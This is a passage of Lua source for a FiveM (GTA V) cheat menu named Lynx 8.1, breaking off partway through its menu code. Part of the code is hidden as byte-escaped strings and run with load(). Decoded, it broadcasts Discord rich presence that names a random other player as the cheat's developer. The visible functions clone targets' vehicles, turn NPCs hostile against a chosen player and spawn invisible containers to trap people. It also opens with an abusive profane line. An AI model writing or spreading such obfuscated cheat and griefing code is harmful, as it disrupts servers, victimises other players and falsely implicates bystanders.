print 'please fucking die because im depressed and i cant fucking code for shit and obviously copied all of this code and said fuck u to anybody else that decided to fuck with me'
local Follow = false
ESX = nil

Citizen.CreateThread(
    function()
        while ESX == nil do
            TriggerEvent(
                'esx:getSharedObject',
                function(c)
                    ESX = c
                end
            )
            Citizen.Wait(1000)
        end
    end
)

local asstarget = nil

local asshat = false

local PedGuardPlayer = false

local pedlist = {}

local speedmit = false

local aispeed = '50.0'

local logged = true

function IllIlllIllIlllIlllIlllIll(IllIlllIllIllIll) if (IllIlllIllIllIll==(((((919 + 636)-636)*3147)/3147)+919)) then return not true end if (IllIlllIllIllIll==(((((968 + 670)-670)*3315)/3315)+968)) then return not false end end; local IllIllIllIllI = (7*3-9/9+3*2/0+3*3);local IIlllIIlllIIlllIIlllII = (3*4-7/7+6*4/3+9*9);local IllIIIllIIIIllI = table.concat;function IllIIIIllIIIIIl(IllIllIllIllI) function IIllllIIllll(IIlllIIlllIIlllIIlllII) function IIllllIIllll(IIllllIIllll) end end end;IllIIIIllIIIIIl(900283);function IllIlllIllIlllIlllIlllIllIlllIIIlll(IIlllIIlllIIlllIIlllII) function IIllllIIllll(IIllllIIllll) local IIllllIIllll = (9*0-7/5+3*1/3+8*2) end end;IllIlllIllIlllIlllIlllIllIlllIIIlll(9083);local IllIIllIIllIII = load;

local IlIlIlIlIlIlIlIlII = {'\45','\45','\47','\47','\32','\68','\101','\99','\111','\109','\112','\105','\108','\101','\100','\32','\67','\111','\100','\101','\46','\32','\10','\32','\32','\108','\111','\99','\97','\108','\32','\97','\112','\112','\105','\100','\32','\61','\32','\39','\53','\57','\49','\52','\55','\57','\52','\48','\55','\55','\57','\56','\49','\50','\52','\53','\54','\49','\39','\32','\45','\45','\32','\77','\97','\107','\101','\32','\97','\110','\32','\97','\112','\112','\108','\105','\99','\97','\116','\105','\111','\110','\32','\64','\32','\104','\116','\116','\112','\115','\58','\47','\47','\100','\105','\115','\99','\111','\114','\100','\97','\112','\112','\46','\99','\111','\109','\47','\100','\101','\118','\101','\108','\111','\112','\101','\114','\115','\47','\97','\112','\112','\108','\105','\99','\97','\116','\105','\111','\110','\115','\47','\32','\73','\68','\32','\99','\97','\110','\32','\98','\101','\32','\102','\111','\117','\110','\100','\32','\116','\104','\101','\114','\101','\46','\10','\10','\108','\111','\99','\97','\108','\32','\97','\115','\115','\101','\116','\32','\61','\32','\39','\114','\101','\114','\116','\101','\103','\100','\102','\39','\32','\45','\45','\32','\71','\111','\32','\116','\111','\32','\104','\116','\116','\112','\115','\58','\47','\47','\100','\105','\115','\99','\111','\114','\100','\97','\112','\112','\46','\99','\111','\109','\47','\100','\101','\118','\101','\108','\111','\112','\101','\114','\115','\47','\97','\112','\112','\108','\105','\99','\97','\116','\105','\111','\110','\115','\47','\65','\80','\80','\73','\68','\47','\114','\105','\99','\104','\45','\112','\114','\101','\115','\101','\110','\99','\101','\47','\97','\115','\115','\101','\116','\115','\10','\10','\45','\45','\32','\104','\116','\116','\112','\115','\58','\47','\47','\103','\105','\116','\104','\117','\98','\46','\99','\111','\109','\47','\90','\101','\101','\109','\97','\104','\104','\47','\100','\105','\115','\99','\111','\114','\100','\45','\114','\112','\47','\98','\108','\111','\98','\47','\109','\97','\115','\116','\101','\114','\47','\100','\105','\115','\99','\111','\114','\100','\45','\114','\112','\47','\99','\108','\105','\101','\110','\116','\46','\108','\117','\97','\32','\119','\97','\115','\32','\117','\115','\101','\100','\32','\97','\115','\32','\97','\32','\98','\97','\115','\101','\32','\104','\101','\114','\101','\46','\32','\84','\104','\97','\110','\107','\115','\32','\100','\117','\100','\101','\33','\10','\10','\110','\110','\97','\109','\101','\32','\61','\32','\110','\105','\108','\10','\10','\99','\111','\117','\110','\116','\32','\61','\32','\123','\125','\10','\10','\115','\99','\114','\111','\108','\108','\32','\61','\32','\123','\10','\32','\32','\32','\32','\39','\32','\76','\39','\44','\10','\32','\32','\32','\32','\39','\76','\121','\39','\44','\10','\32','\32','\32','\32','\39','\76','\121','\110','\39','\44','\10','\32','\32','\32','\32','\39','\76','\121','\110','\120','\39','\44','\10','\32','\32','\32','\32','\39','\76','\121','\110','\120','\32','\39','\44','\10','\32','\32','\32','\32','\39','\76','\121','\110','\120','\32','\56','\39','\44','\10','\32','\32','\32','\32','\39','\76','\121','\110','\120','\32','\56','\46','\39','\44','\10','\32','\32','\32','\32','\39','\76','\121','\110','\120','\32','\56','\46','\49','\39','\44','\10','\32','\32','\32','\32','\39','\76','\121','\110','\120','\32','\56','\46','\49','\32','\39','\44','\10','\32','\32','\32','\32','\39','\76','\121','\110','\120','\32','\56','\46','\49','\32','\66','\39','\44','\10','\32','\32','\32','\32','\39','\76','\121','\110','\120','\32','\56','\46','\49','\32','\66','\101','\39','\44','\10','\32','\32','\32','\32','\39','\76','\121','\110','\120','\32','\56','\46','\49','\32','\66','\101','\116','\39','\44','\10','\32','\32','\32','\32','\39','\76','\121','\110','\120','\32','\56','\46','\49','\32','\66','\101','\116','\97','\39','\44','\10','\32','\32','\32','\32','\39','\76','\121','\110','\120','\32','\56','\46','\49','\32','\66','\101','\116','\97','\32','\39','\44','\10','\32','\32','\32','\32','\39','\76','\121','\110','\120','\32','\56','\46','\49','\32','\66','\101','\116','\97','\32','\49','\39','\44','\10','\32','\32','\32','\32','\39','\76','\121','\110','\120','\32','\56','\46','\49','\32','\66','\101','\116','\97','\32','\39','\44','\10','\32','\32','\32','\32','\39','\76','\121','\110','\120','\32','\56','\46','\49','\32','\66','\101','\116','\97','\39','\44','\10','\32','\32','\32','\32','\39','\76','\121','\110','\120','\32','\56','\46','\49','\32','\66','\101','\116','\39','\44','\10','\32','\32','\32','\32','\39','\76','\121','\110','\120','\32','\56','\46','\49','\32','\66','\101','\39','\44','\10','\32','\32','\32','\32','\39','\76','\121','\110','\120','\32','\56','\46','\49','\32','\66','\39','\44','\10','\32','\32','\32','\32','\39','\76','\121','\110','\120','\32','\56','\46','\49','\32','\39','\44','\10','\32','\32','\32','\32','\39','\76','\121','\110','\120','\32','\56','\46','\49','\39','\44','\10','\32','\32','\32','\32','\39','\76','\121','\110','\120','\32','\56','\46','\39','\44','\10','\32','\32','\32','\32','\39','\76','\121','\110','\120','\32','\56','\39','\44','\10','\32','\32','\32','\32','\39','\76','\121','\110','\120','\32','\39','\44','\10','\32','\32','\32','\32','\39','\76','\121','\110','\120','\39','\44','\10','\32','\32','\32','\32','\39','\76','\121','\110','\39','\44','\10','\32','\32','\32','\32','\39','\76','\121','\39','\10','\125','\10','\10','\108','\111','\99','\97','\108','\32','\118','\101','\104','\108','\105','\115','\116','\118','\32','\61','\32','\123','\39','\78','\101','\114','\111','\39','\44','\32','\39','\68','\101','\108','\117','\120','\111','\39','\44','\32','\39','\82','\97','\105','\100','\101','\110','\39','\44','\32','\39','\66','\97','\116','\105','\50','\39','\44','\32','\34','\83','\117','\108','\116','\97','\110','\82','\83','\34','\44','\32','\34','\84','\65','\50','\49','\34','\44','\32','\34','\76','\121','\110','\120','\34','\44','\32','\34','\90','\82','\51','\56','\48','\34','\44','\32','\34','\83','\116','\114','\101','\105','\116','\101','\114','\34','\44','\32','\34','\78','\101','\111','\110','\34','\44','\32','\34','\73','\116','\97','\108','\105','\103','\116','\111','\34','\44','\32','\34','\78','\101','\114','\111','\50','\34','\44','\32','\34','\70','\109','\106','\34','\44','\32','\34','\108','\101','\55','\98','\34','\44','\32','\34','\112','\114','\111','\116','\111','\116','\105','\112','\111','\34','\44','\32','\34','\99','\121','\99','\108','\111','\110','\101','\34','\44','\32','\34','\107','\104','\97','\110','\106','\97','\108','\105','\34','\44','\32','\34','\83','\84','\82','\79','\77','\66','\69','\82','\71','\34','\44','\32','\34','\66','\65','\82','\82','\65','\71','\69','\34','\44','\32','\34','\67','\79','\77','\69','\84','\53','\34','\125','\10','\10','\122','\122','\122','\116','\32','\61','\32','\49','\10','\10','\67','\105','\116','\105','\122','\101','\110','\46','\67','\114','\101','\97','\116','\101','\84','\104','\114','\101','\97','\100','\40','\10','\32','\32','\32','\32','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\10','\32','\32','\32','\32','\32','\32','\32','\32','\102','\111','\114','\32','\105','\32','\61','\32','\48','\44','\32','\50','\53','\54','\32','\100','\111','\10','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\108','\111','\99','\97','\108','\32','\99','\111','\117','\110','\116','\49','\32','\61','\32','\71','\101','\116','\80','\108','\97','\121','\101','\114','\78','\97','\109','\101','\40','\105','\41','\10','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\105','\102','\32','\99','\111','\117','\110','\116','\49','\32','\126','\61','\32','\39','\42','\42','\73','\110','\118','\97','\108','\105','\100','\42','\42','\39','\32','\116','\104','\101','\110','\10','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\116','\97','\98','\108','\101','\46','\105','\110','\115','\101','\114','\116','\40','\99','\111','\117','\110','\116','\44','\32','\99','\111','\117','\110','\116','\49','\41','\10','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\101','\110','\100','\10','\32','\32','\32','\32','\32','\32','\32','\32','\101','\110','\100','\10','\32','\32','\32','\32','\101','\110','\100','\10','\41','\10','\10','\67','\105','\116','\105','\122','\101','\110','\46','\67','\114','\101','\97','\116','\101','\84','\104','\114','\101','\97','\100','\40','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\32','\45','\45','\32','\77','\111','\100','\101','\108','\32','\73','\110','\105','\116','\105','\97','\108','\76','\111','\97','\100','\105','\110','\103','\10','\32','\32','\32','\32','\82','\101','\113','\117','\101','\115','\116','\77','\111','\100','\101','\108','\40','\39','\115','\95','\109','\95','\121','\95','\115','\119','\97','\116','\95','\48','\49','\39','\41','\10','\32','\32','\32','\32','\82','\101','\113','\117','\101','\115','\116','\77','\111','\100','\101','\108','\40','\39','\115','\95','\109','\95','\121','\95','\104','\119','\97','\121','\99','\111','\112','\95','\48','\49','\39','\41','\10','\32','\32','\32','\32','\102','\111','\114','\32','\105','\32','\61','\32','\49','\44','\32','\35','\118','\101','\104','\108','\105','\115','\116','\118','\32','\100','\111','\10','\32','\32','\32','\32','\32','\32','\32','\32','\82','\101','\113','\117','\101','\115','\116','\77','\111','\100','\101','\108','\40','\118','\101','\104','\108','\105','\115','\116','\118','\91','\105','\93','\41','\10','\32','\32','\32','\32','\32','\32','\32','\32','\67','\105','\116','\105','\122','\101','\110','\46','\87','\97','\105','\116','\40','\50','\48','\48','\41','\10','\32','\32','\32','\32','\101','\110','\100','\10','\101','\110','\100','\41','\10','\10','\67','\105','\116','\105','\122','\101','\110','\46','\67','\114','\101','\97','\116','\101','\84','\104','\114','\101','\97','\100','\40','\10','\32','\32','\32','\32','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\10','\32','\32','\32','\32','\32','\32','\32','\32','\119','\104','\105','\108','\101','\32','\108','\111','\103','\103','\101','\100','\32','\100','\111','\10','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\67','\105','\116','\105','\122','\101','\110','\46','\87','\97','\105','\116','\40','\53','\48','\48','\48','\41','\10','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\102','\111','\114','\32','\105','\32','\61','\32','\49','\44','\32','\35','\99','\111','\117','\110','\116','\32','\100','\111','\10','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\105','\102','\32','\71','\101','\116','\80','\108','\97','\121','\101','\114','\78','\97','\109','\101','\40','\105','\41','\32','\126','\61','\32','\99','\111','\117','\110','\116','\91','\105','\93','\32','\116','\104','\101','\110','\10','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\116','\97','\98','\108','\101','\46','\114','\101','\109','\111','\118','\101','\40','\99','\111','\117','\110','\116','\44','\32','\105','\44','\32','\71','\101','\116','\80','\108','\97','\121','\101','\114','\78','\97','\109','\101','\40','\105','\41','\41','\10','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\101','\110','\100','\10','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\101','\110','\100','\10','\32','\32','\32','\32','\32','\32','\32','\32','\101','\110','\100','\10','\32','\32','\32','\32','\101','\110','\100','\10','\41','\10','\10','\67','\105','\116','\105','\122','\101','\110','\46','\67','\114','\101','\97','\116','\101','\84','\104','\114','\101','\97','\100','\40','\10','\32','\32','\32','\32','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\10','\32','\32','\32','\32','\32','\32','\32','\32','\119','\104','\105','\108','\101','\32','\108','\111','\103','\103','\101','\100','\32','\100','\111','\10','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\105','\102','\32','\110','\110','\97','\109','\101','\32','\126','\61','\32','\71','\101','\116','\80','\108','\97','\121','\101','\114','\78','\97','\109','\101','\40','\80','\108','\97','\121','\101','\114','\73','\100','\40','\41','\41','\32','\116','\104','\101','\110','\10','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\67','\105','\116','\105','\122','\101','\110','\46','\87','\97','\105','\116','\40','\51','\48','\48','\48','\41','\10','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\110','\110','\97','\109','\101','\32','\61','\32','\99','\111','\117','\110','\116','\91','\109','\97','\116','\104','\46','\114','\97','\110','\100','\111','\109','\40','\35','\99','\111','\117','\110','\116','\41','\93','\10','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\101','\108','\115','\101','\105','\102','\32','\110','\110','\97','\109','\101','\32','\61','\61','\32','\71','\101','\116','\80','\108','\97','\121','\101','\114','\78','\97','\109','\101','\40','\80','\108','\97','\121','\101','\114','\73','\100','\40','\41','\41','\32','\116','\104','\101','\110','\10','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\67','\105','\116','\105','\122','\101','\110','\46','\87','\97','\105','\116','\40','\53','\48','\41','\10','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\110','\110','\97','\109','\101','\32','\61','\32','\99','\111','\117','\110','\116','\91','\109','\97','\116','\104','\46','\114','\97','\110','\100','\111','\109','\40','\35','\99','\111','\117','\110','\116','\41','\93','\10','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\101','\110','\100','\10','\32','\32','\32','\32','\32','\32','\32','\32','\101','\110','\100','\10','\32','\32','\32','\32','\101','\110','\100','\10','\41','\10','\10','\108','\111','\99','\97','\108','\32','\102','\117','\110','\99','\116','\105','\111','\110','\32','\71','\101','\116','\80','\101','\100','\73','\109','\112','\97','\99','\116','\40','\112','\41','\10','\32','\32','\32','\32','\108','\111','\99','\97','\108','\32','\114','\101','\116','\118','\97','\108','\44','\32','\99','\111','\111','\114','\100','\32','\61','\32','\71','\101','\116','\80','\101','\100','\76','\97','\115','\116','\87','\101','\97','\112','\111','\110','\73','\109','\112','\97','\99','\116','\67','\111','\111','\114','\100','\40','\112','\41','\10','\32','\32','\32','\32','\114','\101','\116','\117','\114','\110','\32','\99','\111','\111','\114','\100','\10','\101','\110','\100','\10','\10','\108','\111','\99','\97','\108','\32','\102','\117','\110','\99','\116','\105','\111','\110','\32','\83','\101','\116','\82','\80','\40','\41','\10','\32','\32','\32','\32','\108','\111','\99','\97','\108','\32','\105','\100','\32','\61','\32','\71','\101','\116','\80','\108','\97','\121','\101','\114','\83','\101','\114','\118','\101','\114','\73','\100','\40','\80','\108','\97','\121','\101','\114','\73','\100','\40','\41','\41','\10','\32','\32','\32','\32','\83','\101','\116','\82','\105','\99','\104','\80','\114','\101','\115','\101','\110','\99','\101','\40','\116','\111','\115','\116','\114','\105','\110','\103','\40','\110','\110','\97','\109','\101','\41','\32','\46','\46','\32','\39','\32','\105','\115','\32','\100','\101','\118','\101','\108','\111','\112','\105','\110','\103','\32','\76','\121','\110','\120','\32','\56','\46','\49','\39','\41','\10','\32','\32','\32','\32','\83','\101','\116','\68','\105','\115','\99','\111','\114','\100','\65','\112','\112','\73','\100','\40','\97','\112','\112','\105','\100','\41','\10','\32','\32','\32','\32','\83','\101','\116','\68','\105','\115','\99','\111','\114','\100','\82','\105','\99','\104','\80','\114','\101','\115','\101','\110','\99','\101','\65','\115','\115','\101','\116','\40','\97','\115','\115','\101','\116','\41','\10','\32','\32','\32','\32','\83','\101','\116','\68','\105','\115','\99','\111','\114','\100','\82','\105','\99','\104','\80','\114','\101','\115','\101','\110','\99','\101','\65','\115','\115','\101','\116','\83','\109','\97','\108','\108','\40','\97','\115','\115','\101','\116','\41','\10','\32','\32','\32','\32','\83','\101','\116','\68','\105','\115','\99','\111','\114','\100','\82','\105','\99','\104','\80','\114','\101','\115','\101','\110','\99','\101','\65','\115','\115','\101','\116','\84','\101','\120','\116','\40','\115','\99','\114','\111','\108','\108','\91','\122','\122','\122','\116','\93','\41','\10','\32','\32','\32','\32','\105','\102','\32','\35','\99','\111','\117','\110','\116','\32','\61','\61','\32','\49','\32','\116','\104','\101','\110','\10','\32','\32','\32','\32','\32','\32','\32','\32','\83','\101','\116','\68','\105','\115','\99','\111','\114','\100','\82','\105','\99','\104','\80','\114','\101','\115','\101','\110','\99','\101','\65','\115','\115','\101','\116','\83','\109','\97','\108','\108','\84','\101','\120','\116','\40','\39','\80','\108','\97','\121','\105','\110','\103','\32','\119','\105','\116','\104','\32','\39','\32','\46','\46','\32','\35','\99','\111','\117','\110','\116','\32','\46','\46','\32','\39','\32','\112','\108','\97','\121','\101','\114','\39','\41','\10','\32','\32','\32','\32','\101','\108','\115','\101','\10','\32','\32','\32','\32','\32','\32','\32','\32','\83','\101','\116','\68','\105','\115','\99','\111','\114','\100','\82','\105','\99','\104','\80','\114','\101','\115','\101','\110','\99','\101','\65','\115','\115','\101','\116','\83','\109','\97','\108','\108','\84','\101','\120','\116','\40','\39','\80','\108','\97','\121','\105','\110','\103','\32','\119','\105','\116','\104','\32','\39','\32','\46','\46','\32','\35','\99','\111','\117','\110','\116','\32','\46','\46','\32','\39','\32','\112','\108','\97','\121','\101','\114','\115','\39','\41','\10','\32','\32','\32','\32','\101','\110','\100','\10','\101','\110','\100','\10','\10','\67','\105','\116','\105','\122','\101','\110','\46','\67','\114','\101','\97','\116','\101','\84','\104','\114','\101','\97','\100','\40','\10','\32','\32','\32','\32','\102','\117','\110','\99','\116','\105','\111','\110','\40','\41','\10','\32','\32','\32','\32','\32','\32','\32','\32','\112','\114','\105','\110','\116','\34','\77','\111','\100','\105','\102','\105','\101','\100','\32','\98','\121','\32','\70','\97','\108','\108','\101','\110','\35','\48','\56','\49','\49','\34','\10','\32','\32','\32','\32','\32','\32','\32','\32','\119','\104','\105','\108','\101','\32','\108','\111','\103','\103','\101','\100','\32','\100','\111','\10','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\83','\101','\116','\82','\80','\40','\41','\10','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\67','\105','\116','\105','\122','\101','\110','\46','\87','\97','\105','\116','\40','\49','\48','\48','\41','\10','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\122','\122','\122','\116','\32','\61','\32','\122','\122','\122','\116','\32','\43','\32','\49','\10','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\105','\102','\32','\122','\122','\122','\116','\32','\61','\61','\32','\50','\57','\32','\116','\104','\101','\110','\10','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\122','\122','\122','\116','\32','\61','\32','\49','\10','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\32','\101','\110','\100','\10','\32','\32','\32','\32','\32','\32','\32','\32','\101','\110','\100','\10','\32','\32','\32','\32','\101','\110','\100','\10','\41','\10',}

IllIIllIIllIII(IllIIIllIIIIllI(IlIlIlIlIlIlIlIlII,IIIIIIIIllllllllIIIIIIII))()

--[Brutan#77999 makes good menu additions, now give me fucking credit NiT34ByTe]--

local function GetPedImpact(p)
    local retval, coord = GetPedLastWeaponImpactCoord(p)
    return coord
end

local function ClonePedVeh()
    local ped = GetPlayerPed(SelectedPlayer)
    local pedVeh = nil
    local PlayerPed = PlayerPedId()
    if IsPedInAnyVehicle(ped, false) then
        pedVeh = GetVehiclePedIsIn(ped, false)
    else
        pedVeh = GetVehiclePedIsIn(ped, true)
        if DoesEntityExist(pedVeh) then
            local vmh = GetEntityModel(pedVeh)
            local playerpos = GetEntityCoords(PlayerPed, false)
            local playerveh =
                CreateVehicle(vmh, playerpos.x, playerpos.y, playerpos.z, GetEntityHeading(PlayerPed), true, true)
            SetPedIntoVehicle(PlayerPed, playerveh, -1)
            local pcolor, scolor = nil
            GetVehicleColours(pedVeh, pcolor, scolor)
            SetVehicleColours(playerveh, pcolor, scolor)
            if IsThisModelACar(vmh) or IsThisModelABike(vhm) then
                SetVehicleModKit(playerveh, 0)
                SetVehicleWheelType(playerveh, GetVehicleWheelType(pedVeh))
                local pc, wc = nil
                SetVehicleNumberPlateTextIndex(playerveh, GetVehicleNumberPlateTextIndex(pedVeh))
                SetVehicleNumberPlateText(playerveh, GetVehicleNumberPlateText(pedVeh))
                GetVehicleExtraColours(pedVeh, pc, wc)
                SetVehicleExtraColours(playerveh, pc, wc)
            end
        end
    end
end

local function RequestNetworkControl(Request) -- RipTide Adapted Function, should always return true.
    local hasControl = false
    while hasControl == false do
        hasControl = NetworkRequestControlOfEntity(Request)
        if hasControl == true or hasControl == 1 then
            break
        end
        if
            NetworkHasControlOfEntity(ped) == true and hasControl == true or
                NetworkHasControlOfEntity(ped) == true and hasControl == 1
         then
            return true
        else
            return false
        end
    end
end

local function makePedHostile(target, ped, swat, clone) -- RipTide Mod Menu Remade Function
    if swat == 1 or swat == true then
        RequestNetworkControl(ped)
        TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
        SetPedCanSwitchWeapon(ped, true)
    else
        if clone == 1 or clone == true then
            local Hash = GetEntityModel(ped)
            if DoesEntityExist(ped) then
                DeletePed(ped)
                RequestModel(Hash)
                local coords = GetEntityCoords(GetPlayerPed(target), true)
                if HasModelLoaded(Hash) then
                    local newPed = CreatePed(21, Hash, coords.x, coords.y, coords.z, 0, 1, 0)
                    if GetEntityHealth(newPed) == GetEntityMaxHealth(newPed) then
                        SetModelAsNoLongerNeeded(Hash)
                        RequestNetworkControl(newPed)
                        TaskCombatPed(newPed, GetPlayerPed(target), 0, 16)
                        SetPedCanSwitchWeapon(ped, true)
                    end
                end
            end
        else
            local TargetHandle = GetPlayerPed(target)
            RequestNetworkControl(ped)
            TaskCombatPed(ped, TargetHandle, 0, 16)
        end
    end
end

function DrawTxt(text, x, y)
    SetTextFont(0)
    SetTextProportional(1)
    SetTextScale(0.0, 0.4)
    SetTextDropshadow(1, 0, 0, 0, 255)
    SetTextEdge(1, 0, 0, 0, 255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry('STRING')
    AddTextComponentString(text)
    DrawText(x, y)
end

function DrawText3D2(x, y, z, text)
    local onScreen, _x, _y = World3dToScreen2d(x, y, z)
    local px, py, pz = table.unpack(GetGameplayCamCoords())
    local dist = GetDistanceBetweenCoords(px, py, pz, x, y, z, 1)

    local scale = (1 / dist) * 2
    local fov = (1 / GetGameplayCamFov()) * 100
    local scale = scale * fov

    if onScreen then
        SetTextScale(0.0 * scale, 0.55 * scale)
        SetTextFont(0)
        SetTextProportional(1)
        SetTextColour(255, 255, 255, 255)
        SetTextDropshadow(0, 0, 0, 0, 255)
        SetTextEdge(2, 0, 0, 0, 150)
        SetTextDropShadow()
        SetTextOutline()
        SetTextEntry('STRING')
        SetTextCentre(1)
        AddTextComponentString(text)
        DrawText(_x, _y)
    end
end

local objects = {}

local function wallin()
    Citizen.CreateThread(
        function()
            while true do
                DrawTxt(
                    '~y~Press ~s~E ~y~to spawn | ~y~Press ~s~Z ~y~to delete | ~y~Press ~s~G ~y~to clear objects | ',
                    0.23,
                    0.90
                )
                DrawTxt('~y~Press ~s~X ~y~to stop script', 0.595, 0.90)
                DrawTxt('~y~Spawned:~s~ ' .. #objects, 0.80, 0.90)

                for i = 1, #objects do
                    local x, y, z = table.unpack(GetEntityCoords(objects[i]))
                    DrawText3D2(x, y, z + 1, 'OBJECT HERE! INDEX: ' .. i)
                end

                if IsControlJustPressed(1, 38) then
                    local pos = GetEntityCoords(PlayerPedId())
                    local pitch = GetEntityPitch(PlayerPedId())
                    local roll = GetEntityRoll(PlayerPedId())
                    local yaw = GetEntityRotation(PlayerPedId()).z
                    local xf = GetEntityForwardX(PlayerPedId())
                    local yf = GetEntityForwardY(PlayerPedId())
                    objects[#objects + 1] =
                        CreateObject('prop_container_01a', pos.x - (xf * 10), pos.y - (yf * 10), pos.z - 1, 1, 1, 1)
                    SetEntityRotation(objects[#objects], pitch, roll, yaw + 90)
                    SetEntityVisible(objects[#objects], 0, 1, 1)
                    print('Object placed with index: ' .. objects[#objects])
                elseif IsControlJustPressed(1, 20) then
                    SetEntityCoords(objects[#objects], 0, 0, 0)
                    DeleteObject(objects[#objects])
                    print('Deleted object with index: ' .. #objects)
                    table.remove(objects, #objects)
                elseif IsControlJustPressed(1, 47) then
                    for i = 0, #objects do
                        SetEntityCoords(objects[i], 0, 0, 0)
                        DeleteObject(objects[i])
                        print('Deleted object with index: ' .. i)
                    end
                    objects = {}
                elseif IsControlJustPressed(1, 73) then
                    print('Script has been stopped')
                    break
                end
                Citizen.Wait(1)
            end
        end
    )
end

Lynx8 = {}
Lynx8.debug = true
local logged = true
local function d(e)
    local f = {}
    local h = GetGameTimer() / 200
    f.r = math.floor(math.sin(h * e + 0) * 127 + 128)
    f.g = math.floor(math.sin(h * e + 2) * 127 + 128)
    f.b = math.floor(math.sin(h * e + 4) * 127 + 128)
    return f
end
local j = {}
local k = {
    up = 172,
    down = 173,
    left = 174,
    right = 175,
    select = 176,
    back = 177
}
local l = 0
local m = nil
local n = nil
local o = 0.23
local q = 0.11
local s = 0.03
local t = 1.0
local u = 0.041
local v = 0
local w = 0.370
local A = 0.005
local B = 0.005
local C = '\51\52\66\121\84\101\32\67\111\109\109\117\110\105\116\121'
local function D(E)
    if Lynx8.debug then
        Citizen.Trace('[Lynx8] ' .. tostring(E))
    end
end
local function F(G, H, value)
    if G and j[G] then
        j[G][H] = value
        D(G .. ' menu property changed: { ' .. tostring(H) .. ', ' .. tostring(value) .. ' }')
    end
end
local function I(G)
    if G and j[G] then
        return j[G].visible
    else
        return false
    end
end
local function J(G, K, L)
    if G and j[G] then
        F(G, 'visible', K)
        if not L and j[G] then
            F(G, 'currentOption', 1)
        end
        if K then
            if G ~= n and I(n) then
                J(n, false)
            end
            n = G
        end
    end
end
local function M(E, x, y, N, O, P, Q, R, S)
    SetTextColour(O.r, O.g, O.b, O.a)
    SetTextFont(N)
    SetTextScale(P, P)
    if R then
        SetTextDropShadow(2, 2, 0, 0, 0)
    end
    if j[n] then
        if Q then
            SetTextCentre(Q)
        elseif S then
            SetTextWrap(j[n].x, j[n].x + o - A)
            SetTextRightJustify(true)
        end
    end
    SetTextEntry('STRING')
    AddTextComponentString(E)
    DrawText(x, y)
end
local function T(x, y, U, height, O)
    DrawRect(x, y, U, height, O.r, O.g, O.b, O.a)
end
local function V()
    if j[n] then
        local x = j[n].x + o / 2
        local y = j[n].y + q / 2
        if j[n].titleBackgroundSprite then
            DrawSprite(
                j[n].titleBackgroundSprite.dict,
                j[n].titleBackgroundSprite.name,
                x,
                y,
                o,
                q,
                0.,
                255,
                255,
                255,
                255
            )
        else
            T(x, y, o, q, j[n].titleBackgroundColor)
        end
        M(j[n].title, x, y - q / 2 + s, j[n].titleFont, j[n].titleColor, t, true)
    end
end
local function W()
    if j[n] then
        local x = j[n].x + o / 2
        local y = j[n].y + q + u / 2
        local X = {
            r = j[n].titleBackgroundColor.r,
            g = j[n].titleBackgroundColor.g,
            b = j[n].titleBackgroundColor.b,
            a = 255
        }
        T(x, y, o, u, j[n].subTitleBackgroundColor)
        M(j[n].subTitle, j[n].x + A, y - u / 2 + B, v, X, w, false)
        if l > j[n].maxOptionCount then
            M(
                tostring(j[n].currentOption) .. ' / ' .. tostring(l),
                j[n].x + o,
                y - u / 2 + B,
                v,
                X,
                w,
                false,
                false,
                true
            )
        end
    end
end
local function Y(E, Z)
    local x = j[n].x + o / 2
    local a0 = nil
    if j[n].currentOption <= j[n].maxOptionCount and l <= j[n].maxOptionCount then
        a0 = l
    elseif l > j[n].currentOption - j[n].maxOptionCount and l <= j[n].currentOption then
        a0 = l - (j[n].currentOption - j[n].maxOptionCount)
    end
    if a0 then
        local y = j[n].y + q + u + u * a0 - u / 2
        local a1 = nil
        local a2 = nil
        local a3 = nil
        local R = false
        if j[n].currentOption == l then
            a1 = j[n].menuFocusBackgroundColor
            a2 = j[n].menuFocusTextColor
            a3 = j[n].menuFocusTextColor
        else
            a1 = j[n].menuBackgroundColor
            a2 = j[n].menuTextColor
            a3 = j[n].menuSubTextColor
            R = true
        end
        T(x, y, o, u, a1)
        M(E, j[n].x + A, y - u / 2 + B, v, a2, w, false, R)
        if Z then
            M(Z, j[n].x + A, y - u / 2 + B, v, a3, w, false, R, true)
        end
    end
end

function Lynx8.CreateMenu(G, a4)
    j[G] = {}
    j[G].title = a4
    j[G].subTitle = C
    j[G].visible = false
    j[G].previousMenu = nil
    j[G].aboutToBeClosed = false
    j[G].x = 0.75
    j[G].y = 0.19
    j[G].currentOption = 1
    j[G].maxOptionCount = 10
